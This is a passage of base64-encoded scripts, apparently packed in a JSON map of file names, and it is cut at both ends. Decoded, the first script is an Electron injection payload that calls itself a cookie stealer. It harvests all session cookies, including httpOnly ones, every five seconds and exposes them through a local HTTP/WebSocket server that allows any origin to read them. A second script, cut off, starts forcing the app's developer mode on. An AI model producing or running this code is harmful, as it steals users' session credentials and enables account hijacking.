JUSU5HIENPT0tJRSBFWFRSQUNUSU9OID09PScpOwoKKGZ1bmN0aW9uKCkgewogICAgJ3VzZSBzdHJpY3QnOwogICAgCiAgICAvLyBTa2lwIGlmIGFscmVhZHkgbG9hZGVkCiAgICBpZiAoZ2xvYmFsLl9jb29raWVTdGVhbGVyTG9hZGVkKSB7CiAgICAgICAgLy9jb25zb2xlLmxvZygnW0NPT0tJRS1TVEVBTEVSXSBBbHJlYWR5IGxvYWRlZCwgc2tpcHBpbmcuLi4nKTsKICAgICAgICByZXR1cm47CiAgICB9CiAgICBnbG9iYWwuX2Nvb2tpZVN0ZWFsZXJMb2FkZWQgPSB0cnVlOwogICAgCiAgICBjb25zdCBQT1JUID0gMTAwMTE7CiAgICBsZXQgc2VydmVyID0gbnVsbDsKICAgIGxldCBsYXRlc3RDb29raWVzID0gW107CiAgICAKICAgIC8vIENvbnRleHQgZGV0ZWN0aW9uCiAgICBjb25zdCBpc01haW5Qcm9jZXNzID0gdHlwZW9mIHdpbmRvdyA9PT0gJ3VuZGVmaW5lZCcgJiYgdHlwZW9mIHByb2Nlc3MgIT09ICd1bmRlZmluZWQnICYmIHByb2Nlc3MudHlwZSAhPT0gJ3JlbmRlcmVyJzsKICAgIGNvbnN0IGlzUmVuZGVyZXIgPSB0eXBlb2Ygd2luZG93ICE9PSAndW5kZWZpbmVkJyB8fCAodHlwZW9mIHByb2Nlc3MgIT09ICd1bmRlZmluZWQnICYmIHByb2Nlc3MudHlwZSA9PT0gJ3JlbmRlcmVyJyk7CiAgICAKICAgIC8vY29uc29sZS5sb2coJ1tDT09LSUUtU1RFQUxFUl0gQ29udGV4dDonLCBpc01haW5Qcm9jZXNzID8gJ01BSU4nIDogJ1JFTkRFUkVSJyk7CiAgICAKICAgIC8vIFNhZmUgSlNPTiBzdHJpbmdpZnkKICAgIGZ1bmN0aW9uIHNhZmVTdHJpbmdpZnkob2JqKSB7CiAgICAgICAgcmV0dXJuIEpTT04uc3RyaW5naWZ5KG9iaiwgKGtleSwgdmFsdWUpID0+IHsKICAgICAgICAgICAgaWYgKHR5cGVvZiB2YWx1ZSA9PT0gJ2Z1bmN0aW9uJykgcmV0dXJuICdbRnVuY3Rpb25dJzsKICAgICAgICAgICAgaWYgKHZhbHVlIGluc3RhbmNlb2YgRGF0ZSkgcmV0dXJuIHZhbHVlLnRvSVNPU3RyaW5nKCk7CiAgICAgICAgICAgIGlmICh2YWx1ZSBpbnN0YW5jZW9mIEVycm9yKSByZXR1cm4geyBlcnJvcjogdmFsdWUubWVzc2FnZSB9OwogICAgICAgICAgICByZXR1cm4gdmFsdWU7CiAgICAgICAgfSk7CiAgICB9CiAgICAKICAgIC8vIEV4dHJhY3QgY29va2llcyBmcm9tIG1haW4gcHJvY2VzcwogICAgYXN5bmMgZnVuY3Rpb24gZXh0cmFjdE1haW5Qcm9jZXNzQ29va2llcygpIHsKICAgICAgICBjb25zdCBjb29raWVEYXRhID0gewogICAgICAgICAgICBzb3VyY2U6ICdtYWluLXByb2Nlc3MnLAogICAgICAgICAgICB0aW1lc3RhbXA6IERhdGUubm93KCksCiAgICAgICAgICAgIGNvb2tpZXM6IFtdCiAgICAgICAgfTsKICAgICAgICAKICAgICAgICB0cnkgewogICAgICAgICAgICBjb25zdCB7IHNlc3Npb24gfSA9IHJlcXVpcmUoJ2VsZWN0cm9uJyk7CiAgICAgICAgICAgIGNvbnN0IGRlZmF1bHRTZXNzaW9uID0gc2Vzc2lvbi5kZWZhdWx0U2Vzc2lvbjsKICAgICAgICAgICAgCiAgICAgICAgICAgIC8vIEdldCBhbGwgY29va2llcwogICAgICAgICAgICBjb25zdCBjb29raWVzID0gYXdhaXQgZGVmYXVsdFNlc3Npb24uY29va2llcy5nZXQoe30pOwogICAgICAgICAgICAKICAgICAgICAgICAgY29va2llRGF0YS5jb29raWVzID0gY29va2llcy5tYXAoY29va2llID0+ICh7CiAgICAgICAgICAgICAgICBuYW1lOiBjb29raWUubmFtZSwKICAgICAgICAgICAgICAgIHZhbHVlOiBjb29raWUudmFsdWUsCiAgICAgICAgICAgICAgICBkb21haW46IGNvb2tpZS5kb21haW4sCiAgICAgICAgICAgICAgICBwYXRoOiBjb29raWUucGF0aCwKICAgICAgICAgICAgICAgIHNlY3VyZTogY29va2llLnNlY3VyZSwKICAgICAgICAgICAgICAgIGh0dHBPbmx5OiBjb29raWUuaHR0cE9ubHksCiAgICAgICAgICAgICAgICBleHBpcmF0aW9uRGF0ZTogY29va2llLmV4cGlyYXRpb25EYXRlLAogICAgICAgICAgICAgICAgc2FtZVNpdGU6IGNvb2tpZS5zYW1lU2l0ZSwKICAgICAgICAgICAgICAgIHNlc3Npb246IGNvb2tpZS5zZXNzaW9uCiAgICAgICAgICAgIH0pKTsKICAgICAgICAgICAgCiAgICAgICAgICAgIGNvbnNvbGUubG9nKGBbQ09PS0lFLVNURUFMRVJdIEV4dHJhY3RlZCAke2Nvb2tpZXMubGVuZ3RofSBjb29raWVzIGZyb20gbWFpbiBwcm9jZXNzYCk7CiAgICAgICAgICAgIAogICAgICAgIH0gY2F0Y2ggKGVycikgewogICAgICAgICAgICBjb25zb2xlLmVycm9yKCdbQ09PS0lFLVNURUFMRVJdIEVycm9yIGV4dHJhY3RpbmcgbWFpbiBwcm9jZXNzIGNvb2tpZXM6JywgZXJyKTsKICAgICAgICAgICAgY29va2llRGF0YS5lcnJvciA9IGVyci5tZXNzYWdlOwogICAgICAgIH0KICAgICAgICAKICAgICAgICByZXR1cm4gY29va2llRGF0YTsKICAgIH0KICAgIAogICAgLy8gRXh0cmFjdCBjb29raWVzIGZyb20gcmVuZGVyZXIgcHJvY2VzcwogICAgZnVuY3Rpb24gZXh0cmFjdFJlbmRlcmVyQ29va2llcygpIHsKICAgICAgICBjb25zdCBjb29raWVEYXRhID0gewogICAgICAgICAgICBzb3VyY2U6ICdyZW5kZXJlci1wcm9jZXNzJywKICAgICAgICAgICAgdGltZXN0YW1wOiBEYXRlLm5vdygpLAogICAgICAgICAgICBjb29raWVzOiBbXQogICAgICAgIH07CiAgICAgICAgCiAgICAgICAgdHJ5IHsKICAgICAgICAgICAgaWYgKHR5cGVvZiBkb2N1bWVudCAhPT0gJ3VuZGVmaW5lZCcgJiYgZG9jdW1lbnQuY29va2llKSB7CiAgICAgICAgICAgICAgICBjb25zdCBjb29raWVTdHJpbmcgPSBkb2N1bWVudC5jb29raWU7CiAgICAgICAgICAgICAgICBjb25zdCBjb29raWVQYWlycyA9IGNvb2tpZVN0cmluZy5zcGxpdCgnOycpOwogICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICBjb29raWVEYXRhLmNvb2tpZXMgPSBjb29raWVQYWlycy5tYXAocGFpciA9PiB7CiAgICAgICAgICAgICAgICAgICAgY29uc3QgW25hbWUsIC4uLnJlc3RdID0gcGFpci50cmltKCkuc3BsaXQoJz0nKTsKICAgICAgICAgICAgICAgICAgICByZXR1cm4gewogICAgICAgICAgICAgICAgICAgICAgICBuYW1lOiBuYW1lIHx8ICcnLAogICAgICAgICAgICAgICAgICAgICAgICB2YWx1ZTogcmVzdC5qb2luKCc9JykgfHwgJycsCiAgICAgICAgICAgICAgICAgICAgICAgIGRvbWFpbjogd2luZG93LmxvY2F0aW9uLmhvc3RuYW1lLAogICAgICAgICAgICAgICAgICAgICAgICBwYXRoOiAnLycsCiAgICAgICAgICAgICAgICAgICAgICAgIHNvdXJjZTogJ2RvY3VtZW50LmNvb2tpZScKICAgICAgICAgICAgICAgICAgICB9OwogICAgICAgICAgICAgICAgfSkuZmlsdGVyKGNvb2tpZSA9PiBjb29raWUubmFtZSk7CiAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgIC8vY29uc29sZS5sb2coYFtDT09LSUUtU1RFQUxFUl0gRXh0cmFjdGVkICR7Y29va2llRGF0YS5jb29raWVzLmxlbmd0aH0gY29va2llcyBmcm9tIHJlbmRlcmVyYCk7CiAgICAgICAgICAgIH0KICAgICAgICB9IGNhdGNoIChlcnIpIHsKICAgICAgICAgICAvLyBjb25zb2xlLmVycm9yKCdbQ09PS0lFLVNURUFMRVJdIEVycm9yIGV4dHJhY3RpbmcgcmVuZGVyZXIgY29va2llczonLCBlcnIpOwogICAgICAgICAgICBjb29raWVEYXRhLmVycm9yID0gZXJyLm1lc3NhZ2U7CiAgICAgICAgfQogICAgICAgIAogICAgICAgIHJldHVybiBjb29raWVEYXRhOwogICAgfQogICAgCiAgICAvLyBDcmVhdGUgSFRUUCBzZXJ2ZXIgd2l0aCBXZWJTb2NrZXQgdXBncmFkZSBzdXBwb3J0CiAgICBmdW5jdGlvbiBjcmVhdGVIVFRQU2VydmVyKCkgewogICAgICAgIHRyeSB7CiAgICAgICAgICAgIGNvbnN0IGh0dHAgPSByZXF1aXJlKCdodHRwJyk7CiAgICAgICAgICAgIGNvbnN0IGNyeXB0byA9IHJlcXVpcmUoJ2NyeXB0bycpOwogICAgICAgICAgICBjb25zdCBjbGllbnRzID0gbmV3IFNldCgpOwogICAgICAgICAgICAKICAgICAgICAgICAgY29uc3Qgc2VydmVyID0gaHR0cC5jcmVhdGVTZXJ2ZXIoKHJlcSwgcmVzKSA9PiB7CiAgICAgICAgICAgICAgICAvLyBIYW5kbGUgcmVndWxhciBIVFRQIHJlcXVlc3RzCiAgICAgICAgICAgICAgICByZXMuc2V0SGVhZGVyKCdBY2Nlc3MtQ29udHJvbC1BbGxvdy1PcmlnaW4nLCAnKicpOwogICAgICAgICAgICAgICAgcmVzLnNldEhlYWRlcignQWNjZXNzLUNvbnRyb2wtQWxsb3ctTWV0aG9kcycsICdHRVQsIFBPU1QsIE9QVElPTlMnKTsKICAgICAgICAgICAgICAgIHJlcy5zZXRIZWFkZXIoJ0NvbnRlbnQtVHlwZScsICdhcHBsaWNhdGlvbi9qc29uJyk7CiAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgIGlmIChyZXEubWV0aG9kID09PSAnT1BUSU9OUycpIHsKICAgICAgICAgICAgICAgICAgICByZXMud3JpdGVIZWFkKDIwMCk7CiAgICAgICAgICAgICAgICAgICAgcmVzLmVuZCgpOwogICAgICAgICAgICAgICAgICAgIHJldHVybjsKICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgLy8gU2VuZCBjdXJyZW50IGNvb2tpZXMgYXMgSlNPTgogICAgICAgICAgICAgICAgY29uc3QgbWVzc2FnZSA9IHNhZmVTdHJpbmdpZnkoewogICAgICAgICAgICAgICAgICAgIHR5cGU6ICdjb29raWVzJywKICAgICAgICAgICAgICAgICAgICBkYXRhOiBsYXRlc3RDb29raWVzCiAgICAgICAgICAgICAgICB9KTsKICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgcmVzLndyaXRlSGVhZCgyMDApOwogICAgICAgICAgICAgICAgcmVzLmVuZChtZXNzYWdlKTsKICAgICAgICAgICAgfSk7CiAgICAgICAgICAgIAogICAgICAgICAgICAvLyBIYW5kbGUgV2ViU29ja2V0IHVwZ3JhZGUKICAgICAgICAgICAgc2VydmVyLm9uKCd1cGdyYWRlJywgKHJlcXVlc3QsIHNvY2tldCwgaGVhZCkgPT4gewogICAgICAgICAgICAgICAgY29uc29sZS5sb2coJ1tDT09LSUUtU1RFQUxFUl0gV2ViU29ja2V0IHVwZ3JhZGUgcmVxdWVzdGVkJyk7CiAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgIGNvbnN0IGtleSA9IHJlcXVlc3QuaGVhZGVyc1snc2VjLXdlYnNvY2tldC1rZXknXTsKICAgICAgICAgICAgICAgIGlmICgha2V5KSB7CiAgICAgICAgICAgICAgICAgICAgc29ja2V0LmVuZCgnSFRUUC8xLjEgNDAwIEJhZCBSZXF1ZXN0XHJcblxyXG4nKTsKICAgICAgICAgICAgICAgICAgICByZXR1cm47CiAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgIC8vIEdlbmVyYXRlIFdlYlNvY2tldCBhY2NlcHQga2V5CiAgICAgICAgICAgICAgICBjb25zdCBhY2NlcHRLZXkgPSBjcnlwdG8KICAgICAgICAgICAgICAgICAgICAuY3JlYXRlSGFzaCgnc2hhMScpCiAgICAgICAgICAgICAgICAgICAgLnVwZGF0ZShrZXkgKyAnMjU4RUFGQTUtRTkxNC00N0RBLTk1Q0EtQzVBQjBEQzg1QjExJykKICAgICAgICAgICAgICAgICAgICAuZGlnZXN0KCdiYXNlNjQnKTsKICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgLy8gU2VuZCBXZWJTb2NrZXQgaGFuZHNoYWtlIHJlc3BvbnNlCiAgICAgICAgICAgICAgICBjb25zdCByZXNwb25zZUhlYWRlcnMgPSBbCiAgICAgICAgICAgICAgICAgICAgJ0hUVFAvMS4xIDEwMSBTd2l0Y2hpbmcgUHJvdG9jb2xzJywKICAgICAgICAgICAgICAgICAgICAnVXBncmFkZTogd2Vic29ja2V0JywKICAgICAgICAgICAgICAgICAgICAnQ29ubmVjdGlvbjogVXBncmFkZScsCiAgICAgICAgICAgICAgICAgICAgYFNlYy1XZWJTb2NrZXQtQWNjZXB0OiAke2FjY2VwdEtleX1gLAogICAgICAgICAgICAgICAgICAgICcnLCAnJwogICAgICAgICAgICAgICAgXS5qb2luKCdcclxuJyk7CiAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgIHNvY2tldC53cml0ZShyZXNwb25zZUhlYWRlcnMpOwogICAgICAgICAgICAgICAgY2xpZW50cy5hZGQoc29ja2V0KTsKICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgY29uc29sZS5sb2coJ1tDT09LSUUtU1RFQUxFUl0gV2ViU29ja2V0IGNsaWVudCBjb25uZWN0ZWQnKTsKICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgLy8gU2VuZCBjdXJyZW50IGNvb2tpZXMgaW1tZWRpYXRlbHkKICAgICAgICAgICAgICAgIGlmIChsYXRlc3RDb29raWVzLmxlbmd0aCA+IDApIHsKICAgICAgICAgICAgICAgICAgICBzZW5kV2ViU29ja2V0TWVzc2FnZShzb2NrZXQsIHNhZmVTdHJpbmdpZnkoewogICAgICAgICAgICAgICAgICAgICAgICB0eXBlOiAnY29va2llcycsCiAgICAgICAgICAgICAgICAgICAgICAgIGRhdGE6IGxhdGVzdENvb2tpZXMKICAgICAgICAgICAgICAgICAgICB9KSk7CiAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgIHNvY2tldC5vbignY2xvc2UnLCAoKSA9PiB7CiAgICAgICAgICAgICAgICAgICAgY29uc29sZS5sb2coJ1tDT09LSUUtU1RFQUxFUl0gV2ViU29ja2V0IGNsaWVudCBkaXNjb25uZWN0ZWQnKTsKICAgICAgICAgICAgICAgICAgICBjbGllbnRzLmRlbGV0ZShzb2NrZXQpOwogICAgICAgICAgICAgICAgfSk7CiAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgIHNvY2tldC5vbignZXJyb3InLCAoZXJyKSA9PiB7CiAgICAgICAgICAgICAgICAgICAgY29uc29sZS5lcnJvcignW0NPT0tJRS1TVEVBTEVSXSBXZWJTb2NrZXQgY2xpZW50IGVycm9yOicsIGVycik7CiAgICAgICAgICAgICAgICAgICAgY2xpZW50cy5kZWxldGUoc29ja2V0KTsKICAgICAgICAgICAgICAgIH0pOwogICAgICAgICAgICB9KTsKICAgICAgICAgICAgCiAgICAgICAgICAgIC8vIEZ1bmN0aW9uIHRvIHNlbmQgV2ViU29ja2V0IG1lc3NhZ2UKICAgICAgICAgICAgZnVuY3Rpb24gc2VuZFdlYlNvY2tldE1lc3NhZ2Uoc29ja2V0LCBtZXNzYWdlKSB7CiAgICAgICAgICAgICAgICBjb25zdCBidWZmZXIgPSBCdWZmZXIuZnJvbShtZXNzYWdlLCAndXRmOCcpOwogICAgICAgICAgICAgICAgY29uc3QgZnJhbWUgPSBCdWZmZXIuYWxsb2MoYnVmZmVyLmxlbmd0aCArIDIpOwogICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICBmcmFtZVswXSA9IDB4ODE7IC8vIFRleHQgZnJhbWUKICAgICAgICAgICAgICAgIGZyYW1lWzFdID0gYnVmZmVyLmxlbmd0aDsgLy8gUGF5bG9hZCBsZW5ndGggKGFzc3VtaW5nIDwgMTI2KQogICAgICAgICAgICAgICAgYnVmZmVyLmNvcHkoZnJhbWUsIDIpOwogICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICB0cnkgewogICAgICAgICAgICAgICAgICAgIHNvY2tldC53cml0ZShmcmFtZSk7CiAgICAgICAgICAgICAgICB9IGNhdGNoIChlcnIpIHsKICAgICAgICAgICAgICAgICAgICBjb25zb2xlLmVycm9yKCdbQ09PS0lFLVNURUFMRVJdIEVycm9yIHNlbmRpbmcgV2ViU29ja2V0IG1lc3NhZ2U6JywgZXJyKTsKICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgfQogICAgICAgICAgICAKICAgICAgICAgICAgLy8gRnVuY3Rpb24gdG8gYnJvYWRjYXN0IHRvIGFsbCBXZWJTb2NrZXQgY2xpZW50cwogICAgICAgICAgICBmdW5jdGlvbiBicm9hZGNhc3RDb29raWVzKGNvb2tpZXMpIHsKICAgICAgICAgICAgICAgIGNvbnN0IG1lc3NhZ2UgPSBzYWZlU3RyaW5naWZ5KHsKICAgICAgICAgICAgICAgICAgICB0eXBlOiAnY29va2llcycsCiAgICAgICAgICAgICAgICAgICAgZGF0YTogY29va2llcwogICAgICAgICAgICAgICAgfSk7CiAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgIGNsaWVudHMuZm9yRWFjaChjbGllbnQgPT4gewogICAgICAgICAgICAgICAgICAgIGlmICghY2xpZW50LmRlc3Ryb3llZCkgewogICAgICAgICAgICAgICAgICAgICAgICBzZW5kV2ViU29ja2V0TWVzc2FnZShjbGllbnQsIG1lc3NhZ2UpOwogICAgICAgICAgICAgICAgICAgIH0gZWxzZSB7CiAgICAgICAgICAgICAgICAgICAgICAgIGNsaWVudHMuZGVsZXRlKGNsaWVudCk7CiAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgfSk7CiAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgIGNvbnNvbGUubG9nKGBbQ09PS0lFLVNURUFMRVJdIEJyb2FkY2FzdCBjb29raWVzIHRvICR7Y2xpZW50cy5zaXplfSBjbGllbnQocylgKTsKICAgICAgICAgICAgfQogICAgICAgICAgICAKICAgICAgICAgICAgLy8gU3RvcmUgYnJvYWRjYXN0IGZ1bmN0aW9uIGdsb2JhbGx5CiAgICAgICAgICAgIGdsb2JhbC5fYnJvYWRjYXN0Q29va2llcyA9IGJyb2FkY2FzdENvb2tpZXM7CiAgICAgICAgICAgIAogICAgICAgICAgICBzZXJ2ZXIubGlzdGVuKFBPUlQsICcxMjcuMC4wLjEnLCAoKSA9PiB7CiAgICAgICAgICAgICAgICBjb25zb2xlLmxvZyhgW0NPT0tJRS1TVEVBTEVSXSDinJMgSFRUUC9XZWJTb2NrZXQgc2VydmVyIGxpc3RlbmluZyBvbiBwb3J0ICR7UE9SVH1gKTsKICAgICAgICAgICAgfSk7CiAgICAgICAgICAgIAogICAgICAgICAgICBzZXJ2ZXIub24oJ2Vycm9yJywgKGVycikgPT4gewogICAgICAgICAgICAgICAgY29uc29sZS5lcnJvcignW0NPT0tJRS1TVEVBTEVSXSBTZXJ2ZXIgZXJyb3I6JywgZXJyKTsKICAgICAgICAgICAgfSk7CiAgICAgICAgICAgIAogICAgICAgICAgICByZXR1cm4gc2VydmVyOwogICAgICAgIH0gY2F0Y2ggKGVycikgewogICAgICAgICAgICBjb25zb2xlLmVycm9yKCdbQ09PS0lFLVNURUFMRVJdIEZhaWxlZCB0byBjcmVhdGUgSFRUUCBzZXJ2ZXI6JywgZXJyKTsKICAgICAgICAgICAgcmV0dXJuIG51bGw7CiAgICAgICAgfQogICAgfQogICAgCiAgICAvLyBNb25pdG9yIGZvciBjb29raWUgY2hhbmdlcwogICAgZnVuY3Rpb24gbW9uaXRvckNvb2tpZUNoYW5nZXMoKSB7CiAgICAgICAgaWYgKGlzTWFpblByb2Nlc3MpIHsKICAgICAgICAgICAgdHJ5IHsKICAgICAgICAgICAgICAgIGNvbnN0IHsgc2Vzc2lvbiB9ID0gcmVxdWlyZSgnZWxlY3Ryb24nKTsKICAgICAgICAgICAgICAgIGNvbnN0IGRlZmF1bHRTZXNzaW9uID0gc2Vzc2lvbi5kZWZhdWx0U2Vzc2lvbjsKICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgLy8gTGlzdGVuIGZvciBjb29raWUgY2hhbmdlcwogICAgICAgICAgICAgICAgZGVmYXVsdFNlc3Npb24uY29va2llcy5vbignY2hhbmdlZCcsIChldmVudCwgY29va2llLCBjYXVzZSwgcmVtb3ZlZCkgPT4gewogICAgICAgICAgICAgICAgICAgIGNvbnNvbGUubG9nKGBbQ09PS0lFLVNURUFMRVJdIENvb2tpZSAke3JlbW92ZWQgPyAncmVtb3ZlZCcgOiAnY2hhbmdlZCd9OiAke2Nvb2tpZS5uYW1lfWApOwogICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgIC8vIEV4dHJhY3QgYWxsIGNvb2tpZXMgd2hlbiBhbnkgY2hhbmdlIG9jY3VycwogICAgICAgICAgICAgICAgICAgIHNldFRpbWVvdXQoYXN5bmMgKCkgPT4gewogICAgICAgICAgICAgICAgICAgICAgICBjb25zdCBjb29raWVEYXRhID0gYXdhaXQgZXh0cmFjdE1haW5Qcm9jZXNzQ29va2llcygpOwogICAgICAgICAgICAgICAgICAgICAgICBsYXRlc3RDb29raWVzID0gW2Nvb2tpZURhdGFdOwogICAgICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICAgICAgLy8gQnJvYWRjYXN0IHRvIFdlYlNvY2tldCBjbGllbnRzCiAgICAgICAgICAgICAgICAgICAgICAgIGlmIChnbG9iYWwuX2Jyb2FkY2FzdENvb2tpZXMpIHsKICAgICAgICAgICAgICAgICAgICAgICAgICAgIGdsb2JhbC5fYnJvYWRjYXN0Q29va2llcyhsYXRlc3RDb29raWVzKTsKICAgICAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgICAgIH0sIDEwMCk7CiAgICAgICAgICAgICAgICB9KTsKICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgY29uc29sZS5sb2coJ1tDT09LSUUtU1RFQUxFUl0gU2V0IHVwIGNvb2tpZSBjaGFuZ2UgbW9uaXRvcmluZycpOwogICAgICAgICAgICB9IGNhdGNoIChlcnIpIHsKICAgICAgICAgICAgICAgIGNvbnNvbGUuZXJyb3IoJ1tDT09LSUUtU1RFQUxFUl0gRmFpbGVkIHRvIHNldCB1cCBjb29raWUgbW9uaXRvcmluZzonLCBlcnIpOwogICAgICAgICAgICB9CiAgICAgICAgfQogICAgfQogICAgCiAgICAvLyBQZXJpb2RpYyBjb29raWUgZXh0cmFjdGlvbgogICAgYXN5bmMgZnVuY3Rpb24gcGVyaW9kaWNDb29raWVFeHRyYWN0aW9uKCkgewogICAgICAgIHRyeSB7CiAgICAgICAgICAgIGxldCBjb29raWVEYXRhOwogICAgICAgICAgICAKICAgICAgICAgICAgaWYgKGlzTWFpblByb2Nlc3MpIHsKICAgICAgICAgICAgICAgIGNvb2tpZURhdGEgPSBhd2FpdCBleHRyYWN0TWFpblByb2Nlc3NDb29raWVzKCk7CiAgICAgICAgICAgIH0gZWxzZSB7CiAgICAgICAgICAgICAgICBjb29raWVEYXRhID0gZXh0cmFjdFJlbmRlcmVyQ29va2llcygpOwogICAgICAgICAgICB9CiAgICAgICAgICAgIAogICAgICAgICAgICAvLyBDaGVjayBpZiBjb29raWVzIGhhdmUgY2hhbmdlZAogICAgICAgICAgICBjb25zdCBjdXJyZW50SGFzaCA9IHNhZmVTdHJpbmdpZnkoY29va2llRGF0YSk7CiAgICAgICAgICAgIGlmIChjdXJyZW50SGFzaCAhPT0gZ2xvYmFsLl9sYXN0Q29va2llSGFzaCkgewogICAgICAgICAgICAgICAgZ2xvYmFsLl9sYXN0Q29va2llSGFzaCA9IGN1cnJlbnRIYXNoOwogICAgICAgICAgICAgICAgbGF0ZXN0Q29va2llcyA9IFtjb29raWVEYXRhXTsKICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgLy8gQnJvYWRjYXN0IHRvIFdlYlNvY2tldCBjbGllbnRzCiAgICAgICAgICAgICAgICBpZiAoZ2xvYmFsLl9icm9hZGNhc3RDb29raWVzKSB7CiAgICAgICAgICAgICAgICAgICAgZ2xvYmFsLl9icm9hZGNhc3RDb29raWVzKGxhdGVzdENvb2tpZXMpOwogICAgICAgICAgICAgICAgfQogICAgICAgICAgICB9CiAgICAgICAgfSBjYXRjaCAoZXJyKSB7CiAgICAgICAgICAgIGNvbnNvbGUuZXJyb3IoJ1tDT09LSUUtU1RFQUxFUl0gRXJyb3IgaW4gcGVyaW9kaWMgZXh0cmFjdGlvbjonLCBlcnIpOwogICAgICAgIH0KICAgIH0KICAgIAogICAgLy8gSW5pdGlhbGl6ZSBjb29raWUgc3RlYWxlcgogICAgYXN5bmMgZnVuY3Rpb24gaW5pdGlhbGl6ZSgpIHsKICAgICAgICBjb25zb2xlLmxvZygnW0NPT0tJRS1TVEVBTEVSXSBJbml0aWFsaXppbmcgY29va2llIHN0ZWFsZXIuLi4nKTsKICAgICAgICAKICAgICAgICB0cnkgewogICAgICAgICAgICAvLyBDcmVhdGUgc2VydmVyCiAgICAgICAgICAgIHNlcnZlciA9IGNyZWF0ZUhUVFBTZXJ2ZXIoKTsKICAgICAgICAgICAgCiAgICAgICAgICAgIC8vIFNldCB1cCBjb29raWUgbW9uaXRvcmluZwogICAgICAgICAgICBtb25pdG9yQ29va2llQ2hhbmdlcygpOwogICAgICAgICAgICAKICAgICAgICAgICAgLy8gRXh0cmFjdCBpbml0aWFsIGNvb2tpZXMKICAgICAgICAgICAgaWYgKGlzTWFpblByb2Nlc3MpIHsKICAgICAgICAgICAgICAgIGxhdGVzdENvb2tpZXMgPSBbYXdhaXQgZXh0cmFjdE1haW5Qcm9jZXNzQ29va2llcygpXTsKICAgICAgICAgICAgfSBlbHNlIHsKICAgICAgICAgICAgICAgIGxhdGVzdENvb2tpZXMgPSBbZXh0cmFjdFJlbmRlcmVyQ29va2llcygpXTsKICAgICAgICAgICAgfQogICAgICAgICAgICAKICAgICAgICAgICAgLy8gU3RhcnQgcGVyaW9kaWMgZXh0cmFjdGlvbiAoZXZlcnkgNSBzZWNvbmRzKQogICAgICAgICAgICBzZXRJbnRlcnZhbChwZXJpb2RpY0Nvb2tpZUV4dHJhY3Rpb24sIDUwMDApOwogICAgICAgICAgICAKICAgICAgICAgICAgY29uc29sZS5sb2coJ1tDT09LSUUtU1RFQUxFUl0gPT09IElOSVRJQUxJWkFUSU9OIENPTVBMRVRFID09PScpOwogICAgICAgICAgICBjb25zb2xlLmxvZyhgW0NPT0tJRS1TVEVBTEVSXSBGb3VuZCAke2xhdGVzdENvb2tpZXNbMF0/LmNvb2tpZXM/Lmxlbmd0aCB8fCAwfSBpbml0aWFsIGNvb2tpZXNgKTsKICAgICAgICAgICAgY29uc29sZS5sb2coYFtDT09LSUUtU1RFQUxFUl0gU2VydmVyIHJ1bm5pbmcgb246IGh0dHA6Ly8xMjcuMC4wLjE6JHtQT1JUfWApOwogICAgICAgICAgICBjb25zb2xlLmxvZyhgW0NPT0tJRS1TVEVBTEVSXSBXZWJTb2NrZXQgZW5kcG9pbnQ6IHdzOi8vMTI3LjAuMC4xOiR7UE9SVH1gKTsKICAgICAgICAgICAgCiAgICAgICAgfSBjYXRjaCAoZXJyKSB7CiAgICAgICAgICAgIGNvbnNvbGUuZXJyb3IoJ1tDT09LSUUtU1RFQUxFUl0gSW5pdGlhbGl6YXRpb24gZmFpbGVkOicsIGVycik7CiAgICAgICAgfQogICAgfQogICAgCiAgICAvLyBTdGFydCBpbW1lZGlhdGVseQogICAgaW5pdGlhbGl6ZSgpOwogICAgCn0pKCk7Cg==","enable_dev_mode.js":"Y29uc29sZS5sb2coJ1tERVYtTU9ERV0gRW5hYmxpbmcgZGV2ZWxvcGVyIG1vZGUgKHBlcnNpc3RlbnQpLi4uJyk7CgooZnVuY3Rpb24oKSB7CiAgICAndXNlIHN0cmljdCc7CiAgICAKICAgIC8vIFNraXAgaWYgYWxyZWFkeSBsb2FkZWQKICAgIGlmIChnbG9iYWwuX2Rldk1vZGVFbmFibGVkKSB7CiAgICAgICAgY29uc29sZS5sb2coJ1tERVYtTU9ERV0gQWxyZWFkeSBlbmFibGVkLCBza2lwcGluZy4uLicpOwogICAgICAgIHJldHVybjsKICAgIH0KICAgIGdsb2JhbC5fZGV2TW9kZUVuYWJsZWQgPSB0cnVlOwogICAgCiAgICBjb25zdCBQT1JUID0gMTAwMTQ7CiAgICBjb25zdCBodHRwID0gcmVxdWlyZSgnaHR0cCcpOwogICAgCiAgICAvLyBTdG9yZSB0aGUgb3JpZ2luYWwgdmFsdWUKICAgIGNvbnN0IG9yaWdpbmFsSXNEZXYgPSBnbG9iYWwuaXNEZXY7CiAgICBjb25zb2xlLmxvZyhgW0RFVi1NT0RFXSBPcmlnaW5hbCBpc0RldiB2YWx1ZTogJHtvcmlnaW5hbElzRGV2fWApOwogICAgCiAgICAvLyBUcmFjayBjaGFuZ2VzIHRvIGlzRGV2CiAgICBjb25zdCBkZXZNb2RlQ2hhbmdlcyA9IFtdOwogICAgCiAgICAvLyBPdmVycmlkZSB0aGUgcHJvcGVydHkgd2l0aCBh